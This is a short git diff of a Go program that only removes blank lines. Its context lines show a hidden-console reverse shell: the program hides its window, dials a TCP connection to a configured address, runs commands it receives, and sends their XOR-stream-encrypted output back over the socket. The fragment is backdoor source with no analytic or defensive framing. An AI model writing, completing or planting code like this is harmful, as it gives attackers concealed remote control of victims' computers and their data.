@@ -23,7 +23,6 @@ func main() {
             w32.ShowWindowAsync(console, w32.SW_HIDE)
         }
     }
-
     conn, _ := net.Dial("tcp", ip_port)
     run_shell(conn)
 }
@@ -51,7 +50,6 @@ func run_shell(conn net.Conn) {
             enc_cmdout := encryption(true, key, string(cmdout))
             output := string(enc_cmdout) + "\n"
             conn.Write([]byte(output))
-
         }
     }
 
@@ -76,6 +74,5 @@ func encryption(encrypt bool, key []byte, message string) (result string) {
         stream.XORKeyStream(cipherText, cipherText)
         result = string(cipherText)
     }
-
     return
 }
